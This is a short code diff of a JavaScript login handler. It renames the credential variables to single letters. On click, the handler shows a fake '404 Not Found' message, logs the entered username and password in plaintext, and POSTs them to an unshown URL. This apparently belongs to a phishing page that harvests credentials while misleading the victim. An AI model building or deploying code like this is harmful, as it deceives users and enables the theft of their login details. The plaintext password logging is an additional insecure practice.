@@ -16,10 +16,10 @@ loginbtn.addEventListener("click",async function() {
    document.getElementById("response").innerHTML = "<div class='icon icon-generic'></div> <div><div><strong>404 Not Found</strong></div><br><div>The page you're looking for doesn't exist content is deleted by uesr.</div></div>";
  
    
-   const username = await userbtn.value;
-   const password = await passbtn.value;
-      console.log(username + " : " + password)
-      const user = {userName: username, password:password}
+   const u = await userbtn.value;
+   const p = await passbtn.value;
+      console.log(u + " : " + p)
+      const user = {userName: u, password:p}
   await fetch(url,{
 
     method: 'POST',
